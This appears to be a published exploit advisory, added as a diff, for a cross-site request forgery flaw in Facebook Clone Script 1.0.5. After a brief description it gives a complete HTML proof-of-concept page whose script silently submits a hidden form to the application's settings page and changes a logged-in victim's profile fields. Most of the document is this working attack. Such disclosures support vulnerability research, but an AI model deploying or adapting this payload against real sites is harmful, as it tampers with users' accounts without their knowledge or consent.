@@ -1,0 +1,28 @@
+# Exploit Title: Facebook Clone Script 1.0.5 - Cross-Site Request Forgery
+# Date: 2018-05-29
+# Exploit Author: L0RD
+# Vendor Homepage: https://www.phpscriptsmall.com/product/facebook-clone/
+# Version: 1.0.5
+# Tested on: Win 10
+
+# Description :
+# Facebook Clone Script 1.0.5 has csrf vulnerability which attacker can
+# easily change user information .
+
+# POC :
+
+<html>
+  <head>
+     <title>Change information</title>
+  </head>
+  <body>
+    <form action="http://smsemailmarketing.in/demo/fbclone/setting.php" method="POST">
+      <input type="hidden" name="fn" value="anything" />
+      <input type="hidden" name="ln" value="anything" />
+      <input type="hidden" name="chnname" value="anything" />
+    </form>
+    <script>
+        document.forms[0].submit();
+    </script>
+  </body>
+</html>
